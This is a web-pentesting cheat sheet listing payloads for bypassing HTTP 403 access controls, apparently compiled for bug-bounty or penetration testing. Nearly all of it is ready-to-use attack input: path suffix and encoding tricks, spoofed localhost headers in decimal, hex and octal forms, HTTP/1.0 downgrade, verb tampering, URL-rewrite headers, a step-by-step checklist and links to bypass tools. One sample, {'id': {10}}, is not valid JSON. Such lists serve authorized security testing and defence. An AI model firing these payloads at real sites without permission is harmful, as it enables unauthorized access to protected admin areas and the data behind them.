# Access Control Bypass Patterns

## 403 Bypass - Path Manipulation
```bash
# Original blocked
site.com/admin → 403

# Trailing characters
site.com/admin;
site.com/admin/
site.com/admin/.
site.com/admin..;
site.com/admin;%09
site.com/admin;%09..
site.com/admin;%2f..
site.com/admin%09
site.com/admin%20
site.com/admin%23
site.com/admin%2e
site.com/admin%2f
site.com/admin*

# URL encoding
site.com/%61dmin
site.com/ADMIN
site.com/Admin
```

## 403 Bypass - Headers
```http
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Host: 127.0.0.1
```

### Header Values to Try
```
localhost
localhost:80
localhost:443
127.0.0.1
127.0.0.1:80
127.0.0.1:443
2130706433          # decimal
0x7F000001          # hex
0177.0000.0000.0001 # octal
0
127.1
10.0.0.0
10.0.0.1
172.16.0.0
172.16.0.1
192.168.1.0
192.168.1.1
```

## 403 Bypass - HTTP Version Downgrade
```http
# Change HTTP/1.1 to HTTP/1.0
# Remove Host header (server may auto-fill with localhost)
GET /admin HTTP/1.0

```

## Verb Tampering for Access Control
```bash
# If GET blocked, try:
HEAD /admin HTTP/1.1
POST /admin HTTP/1.1
PUT /admin HTTP/1.1
OPTIONS /admin HTTP/1.1
TRACE /admin HTTP/1.1
JEFF /admin HTTP/1.1   # arbitrary verb
```

## URL Rewrite Headers
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
```

## Parameter Pollution for Access Control
```bash
# Form data
POST /page
id[]=10

# Try JSON conversion
{"id": {10}}
```

## Quick Checklist
1. [ ] Try path suffixes: `;` `/` `.` `..;` `%09` `%20`
2. [ ] Add IP spoofing headers with localhost variants
3. [ ] Downgrade to HTTP/1.0, remove Host header
4. [ ] Test all HTTP verbs including arbitrary ones
5. [ ] Try X-Original-URL / X-Rewrite-URL headers
6. [ ] Case manipulation: `/Admin`, `/ADMIN`, `/aDmIn`

## Tools
- https://github.com/yunemse48/403bypasser
- https://github.com/PortSwigger/403-bypasser (Burp extension)

## References
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses
